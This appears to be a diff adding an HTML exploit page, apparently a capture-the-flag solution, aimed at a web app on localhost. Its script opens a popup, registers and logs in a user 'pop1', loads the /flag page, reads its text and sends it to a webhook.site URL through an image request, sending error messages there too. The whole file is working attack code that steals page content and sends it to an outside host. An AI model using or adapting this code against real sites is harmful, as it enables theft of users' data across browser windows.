@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var popup = window.open('http://localhost:3000/register');
+
+setTimeout(function(){
+  try {
+    popup.document.querySelector('input[name="username"]').value = 'pop1';
+    popup.document.querySelector('input[name="password"]').value = 'pop1';
+    popup.document.querySelector('form').submit();
+  } catch(e) {}
+}, 100);
+
+setTimeout(function(){
+  popup.location.href = 'http://localhost:3000/login';
+}, 250);
+
+setTimeout(function(){
+  try {
+    popup.document.querySelector('input[name="username"]').value = 'pop1';
+    popup.document.querySelector('input[name="password"]').value = 'pop1';
+    popup.document.querySelector('form').submit();
+  } catch(e) {}
+}, 400);
+
+setTimeout(function(){
+  popup.location.href = 'http://localhost:3000/flag';
+}, 600);
+
+setTimeout(function(){
+  try {
+    var flag = popup.document.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(flag);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 800);
+</script>
+</body>
+</html>
